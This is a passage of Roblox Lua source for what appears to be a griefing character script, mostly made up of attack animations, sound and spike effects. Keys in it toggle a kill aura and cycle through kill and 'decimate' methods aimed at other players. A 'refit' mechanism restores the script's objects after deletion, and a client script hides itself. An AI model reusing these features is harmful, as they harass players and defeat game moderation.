				for i = 1, self:GetFramesToSecond(.3) do
					self.Animate({
						CFrame.new(-0.0529786237, 0, -0.00697433716, 0.965925872, 0, -0.258818835, 0, 1, 0, 0.258818835, 0, 0.965925872)*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.50579524, -0.147885561, -0.408005863, 0.97209996, 0.151094601, 0.179421127, 0.00389319658, 0.754406452, -0.656396031, -0.234534308, 0.638781071, 0.732770324)*CFrame.Angles(math.rad(0+5*math.cos(sin/35)),math.rad(0+5*math.cos(sin/33)),math.rad(0+5*math.cos(sin/38))),
						CFrame.new(-0.551762879, -2, -0.193185553, 0.939692557, 0, 0.342020094, 0, 1, 0, -0.342020094, 0, 0.939692557),
						CFrame.new(1.52579713, -0.0742611289, -0.423438966, 0.842993081, -0.31206122, -0.438155591, -0.0123708099, 0.803068221, -0.595758557, 0.537782013, 0.507640779, 0.673120499)*CFrame.Angles(math.rad(0+5*math.cos(sin/33)),math.rad(0+5*math.cos(sin/30)),math.rad(0+5*math.cos(sin/40))),
						CFrame.new(0.570710957, -2, -0.12247543, 0.866025329, 0, -0.500000179, 0, 1, 0, 0.500000179, 0, 0.866025329),
						CFrame.new(0.0529785305, 1.50000024, -0.00697511621, 0.965925872, -0.0225574989, 0.257833958, 0, 0.99619472, 0.0871555507, -0.258818835, -0.0841858014, 0.962250233)
					}, .3 / self.FpsValue)
					leftarm.self.Sword.Transparency = .99
					leftarm.self.Sword.Material = Enum.Material.Glass
					leftarm.self.Sword.Highlight.Enabled = true
					game:GetService(""RunService"").PostSimulation:Wait()
				end
				self:SoundEffect(leftarm.self.Sword, 7171761940, 3, math.random(90, 110)/100, true)
				local p = script.Stuff.SlashPart:Clone()
				p.Parent = self.EffectModel
				p.Anchored = true
				p.CanCollide = false
				p.CanTouch = false
				p.CanQuery = false
				p.Material = Enum.Material.Neon
				p.Size = Vector3.new(.3,.1,80)
				p.CFrame = self.CurrentPosition*CFrame.new(1.5,-3,(p.Size.Z/2)+5)
				for i = 1, self:GetFramesToSecond(1) do
					leftarm.self.Sword.Transparency = .99
					leftarm.self.Sword.Material = Enum.Material.Glass
					leftarm.self.Sword.Highlight.Enabled = true
					game:GetService(""RunService"").PostSimulation:Wait()
				end
				self:ClientTween(p, TweenInfo.new(1), {
					Transparency = 1
				})
				for i,v in next, p:GetChildren() do
					pcall(function()
						self:ClientTween(v, TweenInfo.new(1), {
							Rate = 0,
							Velocity = Vector3.new(v.Velocity.X,300,v.Velocity.Z)
						})
					end)
					task.delay(1, function()
						pcall(function()
							v.Enabled = false
						end)
					end)
				end
				task.delay(5, pcall, game.Destroy, p)
				task.delay(.3, function()
					self:Aoe(p.CFrame, Vector3.new(10, 200, p.Size.Z))
					for i = 1, p.Size.Z/2 do
						local s = script.Stuff.Spike:Clone()
						s.Parent = self.EffectModel
						s.Size = Vector3.new(2,0,2)
						s.Color = Color3.new(0,0,math.random())
						s.Material = Enum.Material.Glass
						s.CFrame = p.CFrame*CFrame.new(0,-(2+i)/2,(i*2)-(p.Size.Z/2))
						local t = i/math.random(10,20)
						local siz = 10+(i*(math.random(80, 200)/100))
						self:ClientTween(s, TweenInfo.new(t), {
							CFrame = p.CFrame*CFrame.new(0,siz/2,(i*2)-(p.Size.Z/2))*CFrame.Angles(math.rad(math.random(-10,10)), math.rad(math.random(-10,10)), math.rad(math.random(-10,10))),
							Size = Vector3.new(2,siz,2)
						})
						task.delay(t/3,function()
							self:SoundEffect(s, 4471648128, 3, math.random(80, 120)/100, false)
						end)
						task.delay(t+2, function()
							self:ClientTween(s, TweenInfo.new((t/2)+1), {
								CFrame = p.CFrame*CFrame.new(0,-siz/2,(i*2)-(p.Size.Z/2))*CFrame.Angles(math.rad(math.random(-10,10)), math.rad(math.random(-10,10)), math.rad(math.random(-10,10))),
								Size = Vector3.new(2,0,2)
							})
							task.delay((t/2)+1, pcall, game.Destroy, s)
						end)
					end
				end)
				leftarm.self.Sword.Transparency = 1
				leftarm.self.Sword.Material = Enum.Material.Plastic
				leftarm.self.Sword.Highlight.Enabled = false
				self.Attack = false
			end
			if(Data.Key == ""leftcontrol"")and(not Data.Up)then
				if(self.WalkSpeed == 16)then
					self.WalkSpeed = 32
				else
					self.WalkSpeed = 16
				end
			end
			if(Data.Key == ""m"")and(not Data.Up)then
				self.Muted = not self.Muted
			end
			if(Data.Key == ""t"")and(not Data.Up)then
				local taunts = {
					{
						Id = 966261603,
						Text = ""My vision for the world shall be realized.""
					},
					{
						Id = 966262774,
						Text = ""Don't you dare keep me waiting.""
					},
					{
						Id = 966264954,
						Text = ""Feel the fury of a god!""
					},
					{
						Id = 966268002,
						Text = ""You will kneel before me.""
					},
					{
						Id = 966269704,
						Text = ""A peaceful world has no need for humans. You're pointless!""
					},
					{
						Id = 966270845,
						Text = ""How dare you defy a god.""
					}
				}
				local t = taunts[math.random(1,#taunts)]
				self:SoundEffect(head.self, t.Id, 8, math.random(90,110)/100, true)
				chatfunc(t.Text)
			end
			if(Data.Key == ""semicolon"")and(not Data.Up)then
				self.Killaura = not self.Killaura
				chatfunc(""Killaura = ""..tostring(self.Killaura))
			end
			if(Data.Key == ""q"")and(not Data.Up)then
				self:Effect(self.CurrentPosition.Position, 0, Vector3.new(5,5,5), Color3.new(0,0,1), 2, {
					Transparency = 1,
					Color = Color3.new(),
					Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
				},{
					Scale = Vector3.new()
				})
				self:Effect(self.MouseHit.Position+Vector3.new(0,3.1,0), 0, Vector3.new(5,5,5), Color3.new(0,0,1), 2, {
					Transparency = 1,
					Color = Color3.new(),
					Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
				},{
					Scale = Vector3.new()
				})
				for i = 1,3 do
					self:Lightning(self.CurrentPosition.Position, self.MouseHit.Position+Vector3.new(0,3.1,0), 1, 5, Color3.new(0,0,1), .3)
				end
				self.CurrentPosition = CFrame.new(self.MouseHit.Position+Vector3.new(0,3.1,0))
				self.FakeCurrentPosition = self.CurrentPosition
			end
			if(Data.Key == ""x"")and(not Data.Up)and(not self.AxeEnabled)then
				self.Attack = true
				local orighit = self.MouseHit.Position
				local part = Instance.new(""Part"", self.EffectModel)
				part.Anchored = true
				part.CanCollide = false
				part.CanQuery = false
				part.Color = Color3.new(0,0,math.random())
				part.Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
				part.Position = (leftarm.self.CFrame*CFrame.new(0,-1,0)).Position
				part.Size = Vector3.new(.5,.5,.5)
				part.Material = Enum.Material.Glass
				self:SoundEffect(leftarm.self, 3750951732, 1, math.random(90,110)/100, true)
				for i = 1, self:GetFramesToSecond(1.5) do
					self.Animate({
						CFrame.new(0,0+.1*math.cos(sin/30),0)*CFrame.Angles(math.rad(0),math.rad(20),math.rad(0))*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.5,0+.1*math.cos(sin/36),0.5)*CFrame.Angles(math.rad(-50+5*math.cos(sin/32)),math.rad(20+5*math.cos(sin/35)),math.rad(10+5*math.cos(sin/34))),
						CFrame.new(-0.5,-2-.1*math.cos(sin/30),0+math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(10+1*math.cos(sin/54)),math.rad(0+1*math.cos(sin/50))),
						CFrame.new(1.5,0+1-.1*math.cos(sin/35),0)*CFrame.Angles(math.rad(180+5*math.cos(sin/34)),math.rad(0+5*math.cos(sin/38)),math.rad(5-5*math.cos(sin/32))),
						CFrame.new(0.5,-2-.1*math.cos(sin/30),0+math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(-10-1*math.cos(sin/56)),math.rad(0-1*math.cos(sin/53))),
						CFrame.new(0,1.5,0)*CFrame.Angles(math.rad(-3+3*math.cos(sin/31)),math.rad(-20+3*math.cos(sin/35)),math.rad(0-3*math.cos(sin/39))),
					},.1 / self.FpsValue)
					self:Effect(leftarm.self.CFrame*CFrame.new(math.random(-2,2),-1+math.random(-2,2),math.random(-2,2)), 0, Vector3.new(.3,.3,.3), Color3.new(0,0,math.random()), 1, {
						Position = (leftarm.self.CFrame*CFrame.new(0,-1,0)).Position,
						Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360)),
						Transparency = 1
					},{
						Scale = Vector3.new(0,0,0)
					})
					part.Position = (leftarm.self.CFrame*CFrame.new(0,-1,0)).Position
					game:GetService(""RunService"").PostSimulation:Wait()
				end
				for i = 1, self:GetFramesToSecond(.3) do
					self.Animate({
						CFrame.new(0,0+.1*math.cos(sin/30),0)*CFrame.Angles(math.rad(0),math.rad(-20),math.rad(0))*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.5,0.2+.1*math.cos(sin/36),-0.5)*CFrame.Angles(math.rad(80+5*math.cos(sin/32)),math.rad(-20+5*math.cos(sin/35)),math.rad(-20+5*math.cos(sin/34))),
						CFrame.new(-0.5,-2-.1*math.cos(sin/30),0+math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(10+1*math.cos(sin/54)),math.rad(0+1*math.cos(sin/50))),
						CFrame.new(1.5,0+1-.1*math.cos(sin/35),0)*CFrame.Angles(math.rad(180+5*math.cos(sin/34)),math.rad(0+5*math.cos(sin/38)),math.rad(5-5*math.cos(sin/32))),
						CFrame.new(0.5,-2-.1*math.cos(sin/30),0+math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(-10-1*math.cos(sin/56)),math.rad(0-1*math.cos(sin/53))),
						CFrame.new(0,1.5,0)*CFrame.Angles(math.rad(-3+3*math.cos(sin/31)),math.rad(20+3*math.cos(sin/35)),math.rad(0-3*math.cos(sin/39))),
					},.3 / self.FpsValue)
					part.Position = (leftarm.self.CFrame*CFrame.new(0,-1,0)).Position
					game:GetService(""RunService"").PostSimulation:Wait()
				end
				self:SoundEffect(leftarm.self, 608600954, 3, math.random(90,110)/100, true)
				local pos = orighit+Vector3.new(0,40+math.random(-2,2),0)
				local mag = (pos - orighit).Magnitude
				local bez = bezier.new((leftarm.self.CFrame*CFrame.new(0,-1,0)).Position,pos+Vector3.new(0,mag*2,0),pos)
				task.spawn(function()
					for i = 0, 1, 1/240 do
						for i = 1, self:GetFramesToSecond(1/240) do
							game:GetService(""RunService"").PostSimulation:Wait()
						end
					end
					for i = 1, self:GetFramesToSecond(.3) do
						self.Animate({
							CFrame.new(0,0+.1*math.cos(sin/30),0)*CFrame.Angles(math.rad(0),math.rad(50),math.rad(0))*CFrame.Angles(0,math.rad(-180),0),
							CFrame.new(-1.5,0+.1*math.cos(sin/36),0)*CFrame.Angles(math.rad(0+5*math.cos(sin/32)),math.rad(30+5*math.cos(sin/35)),math.rad(-5+5*math.cos(sin/34))),
							CFrame.new(-0.5,-2-.1*math.cos(sin/30),0+math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(10),math.rad(0)),
							CFrame.new(1.5+.5,0+.3-.1*math.cos(sin/35),-0.3)*CFrame.Angles(math.rad(100+5*math.cos(sin/30)),math.rad(0+5*math.cos(sin/30)),math.rad(50-5*math.cos(sin/32))),
							CFrame.new(0.5,-2-.1*math.cos(sin/30),0+math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(-30),math.rad(0)),
							CFrame.new(0,1.5,0)*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(-50+1*math.cos(sin/35)),math.rad(0-1*math.cos(sin/33))),
						},.3 / self.FpsValue)
						game:GetService(""RunService"").PostSimulation:Wait()
					end
					for i = 1, self:GetFramesToSecond(.6) do
						game:GetService(""RunService"").PostSimulation:Wait()
					end
					repeat game:GetService(""RunService"").PostSimulation:Wait() until (part.Position == pos) or (not part or not part:IsDescendantOf(workspace))
					self:SpawnTrail(rightarm.self.HandCannon.Hole.Position, part.Position, Color3.new(0,0,1), .5)
					self:SoundEffect(rightarm.self.HandCannon.Hole, 9058737882, 2, math.random(90,110)/100, true)
					self:SoundEffect(rightarm.self.HandCannon.Hole, 9060276709, 1, math.random(90,110)/100, true)
					self.SmokeTime += self:GetFramesToSecond(3)
					for i = 1,math.random(1,20) do
						self:Effect(rightarm.self.HandCannon.Hole.Position, 0, Vector3.new(math.random(),math.random(),math.random()), Color3.new(0,0,math.random()), .5, {
							Transparency = 1,
							Color = Color3.new(),
							Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360)),
							Position = rightarm.self.HandCannon.Hole.Position+Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
						},{
							Scale = Vector3.new()
						})
						self:Effect(part.Position, 0, Vector3.new(math.random(),math.random(),math.random()), Color3.new(0,0,math.random()), .5, {
							Transparency = 1,
							Color = Color3.new(),
							Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360)),
							Position = self.MouseHit.Position+Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
						},{
							Scale = Vector3.new()
						})
					end
					self:Effect(part.Position, 0, Vector3.new(10,10,10), Color3.new(0,0,math.random()), 2, {
						Transparency = 1,
						Color = Color3.new(),
						Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
					},{
						Scale = Vector3.new()
					})
					for i = 1, self:GetFramesToSecond(.3) do
						self.Animate({
							CFrame.new(0,0+.1*math.cos(sin/30),0)*CFrame.Angles(math.rad(0),math.rad(50),math.rad(0))*CFrame.Angles(0,math.rad(-180),0),
							CFrame.new(-1.5,0+.1*math.cos(sin/36),0)*CFrame.Angles(math.rad(0+5*math.cos(sin/32)),math.rad(30+5*math.cos(sin/35)),math.rad(-5+5*math.cos(sin/34))),
							CFrame.new(-0.5,-2-.1*math.cos(sin/30),0+math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(10),math.rad(0)),
							CFrame.new(1.5+.5,0+.3-.1*math.cos(sin/35),-0.3)*CFrame.Angles(math.rad(130+5*math.cos(sin/30)),math.rad(0+5*math.cos(sin/30)),math.rad(50-5*math.cos(sin/32))),
							CFrame.new(0.5,-2-.1*math.cos(sin/30),0+math.rad(3)*math.cos(sin/30))*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(-30),math.rad(0)),
							CFrame.new(0,1.5,0)*CFrame.Angles(math.rad(-3+3*math.cos(sin/30)),math.rad(-50+1*math.cos(sin/35)),math.rad(0-1*math.cos(sin/33))),
						},.3 / self.FpsValue)
						game:GetService(""RunService"").PostSimulation:Wait()
					end
					self.Attack = false
				end)
				for i = 0, 1, 1/60 do
					local pos = bez.calc(i)
					part.CFrame = CFrame.lookAt(part.Position, pos)
					part.Position = pos
					for i = 1, self:GetFramesToSecond(1/60) do
						game:GetService(""RunService"").PostSimulation:Wait()
					end
				end
				self:SoundEffect(part, 4458749278, 10, math.random(90,110)/100, true)
				pcall(game.Destroy,part)
				for i = 1, 40 do
					local siz = math.random(40, 60)
					local siz2 = math.random(40, 60)
					self:Effect(pos, 0, Vector3.new(siz, 1, siz2), Color3.new(0,0,math.random()), 2, {
						Transparency = 1,
						Color = Color3.new(),
						Orientation = Vector3.new(math.random(-10,10),math.random(-360,360),math.random(-10,10))
					}, {
						Scale = Vector3.new()
					})
					local posa = pos+Vector3.new(math.random(-siz,siz)/2,0,math.random(-siz2,siz2)/2)
					local hit, pos2 = self:Raycast(posa, posa+Vector3.new(math.random(-siz,siz),-99999,math.random(-siz2,siz2)), 999999, self.Ignore)
					if(hit)then
						local cf = CFrame.lookAt(pos+Vector3.new(math.random(-siz,siz)/2,0,math.random(-siz2,siz2)/2), pos2)
						local mag = (cf.Position - pos2).Magnitude
						self:Effect(cf, 0, Vector3.new(.5,.5,.5), Color3.new(0,0,math.random()), mag/70, {
							Position = pos2,
							Color = Color3.new()
						},{
							Scale = Vector3.new(.5,.5,5)*20
						})
						task.delay(mag/70,function()
							local part = Instance.new(""Part"", self.EffectModel)
							part.Anchored = true
							part.CanCollide = false
							part.CanQuery = false
							part.Color = Color3.new(0,0,math.random())
							part.Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
							part.Position = pos2
							part.Size = Vector3.new(1,1,1)
							part.Material = Enum.Material.Glass
							part.Transparency = 1
							self:SoundEffect(part, 3750959938, 5, math.random(90,110)/100, true)
							game:GetService(""Debris""):AddItem(part,0)
							self:Effect(pos2, 0, Vector3.new(math.random(5,10),math.random(5,10),math.random(5,10)), Color3.new(0,0,math.random()), math.random(1,2), {
								Transparency = 1,
								Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360)),
								Color = Color3.new()
							},{
								Scale = Vector3.new(0,0,0)
							})
							self:Aoe(pos2, 15)
							for i = 1, math.random(1,5) do
								local randompos = math.random(-30,30)
								local randompos2 = math.random(-30,30)
								local yrand = math.random(15,30)
								local hit, pos3 = self:Raycast(pos2+Vector3.new(randompos,yrand,randompos2), pos2+Vector3.new(randompos,-9999,randompos2), 999999, self.Ignore)
								local poss1, poss2, poss3 = pos2, pos2+Vector3.new(randompos,yrand,randompos2), pos3
								local bez = bezier.new(poss1,poss2,poss3)
								local part = Instance.new(""Part"", self.EffectModel)
								part.Anchored = true
								part.CanCollide = false
								part.CanQuery = false
								part.Color = Color3.new(0,0,math.random())
								part.Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
								part.Position = poss1
								part.Size = Vector3.new(1,1,1)
								part.Material = Enum.Material.Glass
								task.spawn(function()
									local t = math.random(50,70)
									for i = 0, 1, 1/t do
										local pos = bez.calc(i)
										part.CFrame = CFrame.lookAt(part.Position, pos)
										part.Position = pos
										for i = 1, self:GetFramesToSecond(1/t) do
											game:GetService(""RunService"").PostSimulation:Wait()
										end
									end
									local posss = part.Position
									self:SoundEffect(part, 8388603871, math.random(1,3)/2, math.random(90,110)/100, true)
									pcall(game.Destroy,part)
									self:Effect(posss, 0, Vector3.new(5,5,5), Color3.new(0,0,math.random()), math.random(), {
										Transparency = 1,
										Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360)),
										Color = Color3.new(0,0,0)
									},{
										Scale = Vector3.new()
									})
									self:Aoe(posss, 7)
								end)
							end
						end)
					end
					task.wait(0.1)
				end
			end
			if(Data.Key == ""n"")and(not Data.Up)then
				if(self.Ids[self.SoundIdNum+1])then
					self.SoundIdNum += 1
				else
					self.SoundIdNum = 1
				end
			end
			if(Data.Key == ""quote"")and(not Data.Up)then
				self.ClientAoe = not self.ClientAoe
				chatfunc(""ClientAoe = ""..tostring(self.ClientAoe))
			end
			if(Data.Key == ""l"")and(not Data.Up)then
				self.Pitch = self.Pitch == 0.8 and 1 or 0.8
				chatfunc(""Pitch = ""..tostring(self.Pitch))
			end
			if(Data.Key == ""k"")and(not Data.Up)then
				self.KillMethod += 1
				if(self.KillMethod > #self.KillMethods)then
					self.KillMethod = 1
				end
				chatfunc(""Kill method = ""..self.KillMethods[self.KillMethod].Name)
			end
			if(Data.Key == ""j"")and(not Data.Up)then
				self.DecimateMethod += 1
				if(self.DecimateMethod > #self.DecimateMethods)then
					self.DecimateMethod = 1
				end
				chatfunc(""Decimate method = ""..self.DecimateMethods[self.DecimateMethod].Name)
			end
			if(Data.Key == ""h"")and(not Data.Up)then
				Decimated = {}
				for i,v in next, self.DecimateConnections do
					pcall(function()
						v:Disconnect()
					end)
				end
				self.DecimateConnections = {}
				chatfunc(""Cleared decimate table."")
			end
			if(Data.Key == ""g"")and(not Data.Up)then
				self.RefitMethod += 1
				if(self.RefitMethod > #self.RefitMethods)then
					self.RefitMethod = 1
				end
				refitcore:SetMethod(self.RefitMethods[self.RefitMethod])
				chatfunc(""Refit method = ""..self.RefitMethods[self.RefitMethod])
			end
			if(Data.Key == ""e"")and(not Data.Up)then
				self.AxeEnabled = not self.AxeEnabled
				if(self.AxeEnabled)then
					axe.self:Destroy()
				else
					rightarm.self:Destroy()
				end
			end
			if(Data.Key == ""z"")and(not Data.Up)and(self.AxeEnabled)then
				self.Attack = true
				for i = 1, self:GetFramesToSecond(1) do
					self.Animate({
						CFrame.new(-5.8952719e-07, -0.15160726, -0.0387812965, 0.98480773, 0, 0.173648179, 0.0151344351, 0.99619472, -0.0858316422, -0.172987401, 0.087155737, 0.981060266)*CFrame.Angles(math.rad(-10),math.rad(-180),0),
						CFrame.new(-1.2908144, -0.0949745774, 0.448598742, 0.906307697, -0.298836291, 0.298836172, 0, 0.707106769, 0.707106948, -0.4226183, -0.640856504, 0.640856266),
						CFrame.new(-0.586508811, -1.84620976, 0.00386648625, 0.939362228, 0.0151344351, 0.342592359, -0.0435778648, 0.99619472, 0.0754790828, -0.340146363, -0.0858316422, 0.936447203),
						CFrame.new(1.60388672, 0.609986782, -0.589171946, 0.98480767, -0.157378703, 0.0733871013, 1.89070533e-07, -0.42261833, -0.906307757, 0.173648253, 0.892538965, -0.416197717),
						CFrame.new(0.533532739, -1.86271262, 0.00982183218, 0.939807177, 0.0151344351, -0.341369599, 0.0151344547, 0.99619472, 0.0858316347, 0.341369629, -0.0858316422, 0.936001897),
						CFrame.new(6.40749931e-07, 1.49999952, -2.38418579e-07, 0.98480773, -0.0151344361, -0.172987416, 0, 0.99619478, -0.087155737, 0.173648179, 0.0858316422, 0.981060266),
						CFrame.new(0.600942433, 1.02222443, -3.29460645, 0.0996003002, 0.142244399, 0.984807074, -0.819151103, 0.573576033, 5.73565501e-07, -0.564861298, -0.806706071, 0.173648477)
					}, .1 / self.FpsValue)
					game:GetService(""RunService"").PostSimulation:Wait()
				end
				self:SoundEffect(axe.self, 6241709963, 3, 1, true)
				for i = 1, self:GetFramesToSecond(.2) do
					self.Animate({
						CFrame.new(-2.5331974e-07, -0.132146403, -0.159132719, 0.98480773, 0, 0.173648179, -0.0151344026, 0.99619472, 0.0858314484, -0.172987401, -0.0871555433, 0.981060266)*CFrame.Angles(math.rad(10),math.rad(-180),0),
						CFrame.new(-1.290815, -0.0949756801, 0.448599339, 0.906307697, -0.298836261, 0.298836172, 3.7252903e-09, 0.707106769, 0.707106948, -0.42261827, -0.640856445, 0.640856206),
						CFrame.new(-0.551085234, -1.86638451, -0.19703275, 0.939362228, -0.0151344026, 0.342592359, 0.0435777679, 0.99619472, -0.0754789189, -0.340146363, 0.0858314484, 0.936447203),
						CFrame.new(1.51297235, 0.111889355, -0.649452448, 0.98480767, -0.150383726, -0.0868238956, 1.80666987e-07, 0.500000119, -0.866025388, 0.173648059, 0.852868438, 0.492403984),
						CFrame.new(0.568956316, -1.84988165, -0.191077381, 0.939807177, -0.0151344026, -0.341369599, -0.0151344212, 0.99619472, -0.0858314484, 0.341369629, 0.0858314484, 0.936001897),
						CFrame.new(2.64495611e-07, 1.50000024, -5.96046448e-08, 0.98480773, 0.0151343998, -0.172987416, 0, 0.99619478, 0.0871555358, 0.173648179, -0.0858314559, 0.981060266),
						CFrame.new(0,-.2,0)*CFrame.new(0.402386904, -4.31485748, -1.59267914, -0.142244518, 0.0996005833, 0.984807193, -0.573575318, -0.819150686, 3.99600793e-07, 0.806706607, -0.564861715, 0.173647866)*CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10))
					}, .3 / self.FpsValue)
					game:GetService(""RunService"").PostSimulation:Wait()
				end
				local p = {
					Size = Vector3.new(0,0,40),
					CFrame = self.CurrentPosition*CFrame.new(-1.5,-3,(40/2)+5)
				}
				self:Aoe(p.CFrame, Vector3.new(p.Size.Z*1.3, 50, p.Size.Z))
				for i = 1, p.Size.Z/2 do
					local s = script.Stuff.Spike:Clone()
					s.Parent = self.EffectModel
					s.Size = Vector3.new(2,0,2)
					s.Color = Color3.new(0,0,math.random())
					s.Material = Enum.Material.Glass
					local x = math.random(-i,i)
					s.CFrame = p.CFrame*CFrame.new(x,-(2+i)/2,(i*2)-(p.Size.Z/2))
					local t = i/math.random(10,20)
					local siz = 1+(i*(math.random(80, 200)/100))
					self:ClientTween(s, TweenInfo.new(t), {
						CFrame = p.CFrame*CFrame.new(x,siz/2,(i*2)-(p.Size.Z/2))*CFrame.Angles(math.rad(math.random(-10,10)), math.rad(math.random(-10,10)), math.rad(math.random(-10,10))),
						Size = Vector3.new(2,siz,2)
					})
					task.delay(t/3,function()
						self:SoundEffect(s, 4471648128, 3, math.random(80, 120)/100, false)
					end)
					task.delay(t+2, function()
						self:ClientTween(s, TweenInfo.new((t/2)+1), {
							CFrame = p.CFrame*CFrame.new(x,-siz/2,(i*2)-(p.Size.Z/2))*CFrame.Angles(math.rad(math.random(-10,10)), math.rad(math.random(-10,10)), math.rad(math.random(-10,10))),
							Size = Vector3.new(2,0,2)
						})
						task.delay((t/2)+1, pcall, game.Destroy, s)
					end)
				end
				task.wait(.5)
				self.Attack = false
			end
		elseif(Type == ""CameraCFrame"")then
			self.CameraCFrame = Data.CFrame
		elseif(Type == ""ShiftLock"")then
			self.ShiftLock = Data.Value
		elseif(Type == ""Destroy"")then
			pcall(game.Destroy,Data)
		end
	end

	remote = nil
	self:AddRefit(getfenv(), ""remote"", Instance.new(""RemoteEvent""), {
		OnDestroy = function()
			table.insert(self.Connections, remote.self.OnServerEvent:Connect(self.RemoteFuncs))
		end,
		Properties = {
			Parent = game:GetService(""ReplicatedStorage""),
			Name = ""__FakeChar""..self:GetCurrentPlayer().UserId,
		}
	})
	table.insert(self.Connections, remote.self.OnServerEvent:Connect(self.RemoteFuncs))
	remotefunction = nil
	self:AddRefit(getfenv(), ""remotefunction"", Instance.new(""RemoteFunction""), {
		Properties = {
			Parent = game:GetService(""ReplicatedStorage""),
			Name = ""__FakeCharRemoteFunction""..self:GetCurrentPlayer().UserId
		}
	})

	self.Remote = remote.self
	self.RemoteFunction = remotefunction.self
	self.Torso = CFrame.new()
	self.CurrentPosition = CFrame.new(0,5,0)
	self.FakeCurrentPosition = self.CurrentPosition
	self.LastPosition = self.CurrentPosition
	self.FakeLastPosition = self.FakeCurrentPosition
	self.Falling = false
	self.Velocity = Vector3.new()
	self.Jumping = false
	self.Walking = false
	self.Attack = false
	self.Flying = false


	self.UpdateIgnore = function()
		self.Ignore = {head.self, leftarm.self, leftleg.self, rightarm.self, rightleg.self, torso.self, campart.self, headval.self, axe.self, remote.self, remotefunction.self, self.EffectModel}
	end
	self.UpdateIgnore()

	-- -- -- -- -- -- -- -- -- -- -- -- -- --

	self.Animate = function(tbl, time)
		pcall(function()
			self.Torso = self.Torso:Lerp(tbl[1], time)
			self.LeftArm = self.LeftArm:Lerp(tbl[2], time)
			self.LeftLeg = self.LeftLeg:Lerp(tbl[3], time)
			self.RightArm = self.RightArm:Lerp(tbl[4], time)
			self.RightLeg = self.RightLeg:Lerp(tbl[5], time)
			self.Head = self.Head:Lerp(tbl[6], time)
			self.Axe = self.Axe:Lerp(tbl[7], time)
		end)
	end

	self.WeaponCheck = function()
		if(not self.AxeEnabled)then
			axe.ModifyProperty(""Transparency"", 1)
			for i,v in next, axe.self:GetChildren() do
				pcall(function()
					if(typeof(v.Transparency) == ""NumberSequence"")then
						v.Transparency = NumberSequence.new(1)
					end
				end)
				
				pcall(function()
					if(typeof(v.Transparency) == ""number"")then
						v.Transparency = 1
					end
				end)
			end
		else
			axe.ModifyProperty(""Transparency"", 0)
			for i,v in next, rightarm.self.HandCannon:GetDescendants() do
				pcall(function()
					if(typeof(v.Transparency) == ""number"")then
						v.Transparency = 1
					end
				end)
			end
		end
	end

	local c2 = self:GetFramesToSecond(1/80)
	local c = 0
	local b2 = self:GetFramesToSecond(1/60)
	local b = 0
	local d2 = self:GetFramesToSecond(1/60)
	local d = 0
	local a2 = self:GetFramesToSecond(0.2)
	local a = 0
	local e2 = self:GetFramesToSecond(1/60)
	local e = 0
	local Step = ""R""
	local mus2 = nil
	local mus2id = 3619734707
	local mus2vol = 1
	local mus2pit = .8
	local mus2tp = 0
	
	local Client = NLS([[
	task.wait()
	script.Parent = nil
	
	local plr = game:GetService(""Players"").LocalPlayer
local mouse = plr:GetMouse()
local uis = game:GetService('UserInputService')
local Remote = game:GetService('ReplicatedStorage'):FindFirstChild(""__FakeChar""..plr.UserId)
local RemoteFunction = game:GetService('ReplicatedStorage'):FindFirstChild(""__FakeCharRemoteFunction""..plr.UserId)
local LastRemote = Remote
local scriptStopped = false
local connections = {}
local objectsforcanquery = {}
local changedconnections = {}
local CameraPosition, CameraRotation, CameraZoom, CameraCFrame, lastZoom = Vector3.new(), Vector2.new(0,-15), 15, CFrame.new(), 15
local shiftlocked =  game:GetService(""UserInputService"").MouseBehavior == Enum.MouseBehavior.LockCenter

table.insert(connections, uis.InputBegan:Connect(function(io, gpe)
	if (io.KeyCode == Enum.KeyCode.LeftShift or io.KeyCode == Enum.KeyCode.RightShift) and not uis:GetFocusedTextBox() then
		shiftlocked = not shiftlocked
	end
	if(gpe)then
		return
	end
	if(Remote)then
		Remote:FireServer(""Mouse"", {
			Key = string.lower(io.KeyCode.Name),
			Hit = mouse.Hit,
			Target = mouse.Target,
			Up = false
		})
	end
	if io.KeyCode == Enum.KeyCode.I then
		if CameraZoom > 1 then
			CameraZoom = CameraZoom*.8
		else
			CameraZoom = 0
		end
	elseif io.KeyCode == Enum.KeyCode.O then
		if CameraZoom >= 1 then
			CameraZoom = CameraZoom*1.25
		else
			CameraZoom = 1
		end
	end
	if io.UserInputType == Enum.UserInputType.MouseWheel then
		if io.Position.Z > 0 then
			if CameraZoom > 1 then
				CameraZoom = CameraZoom*.8
			else
				CameraZoom = 0
			end
		else
			if CameraZoom >= 1 then
				CameraZoom = CameraZoom*1.25
			else
				CameraZoom = 1
			end
		end
	end
end))

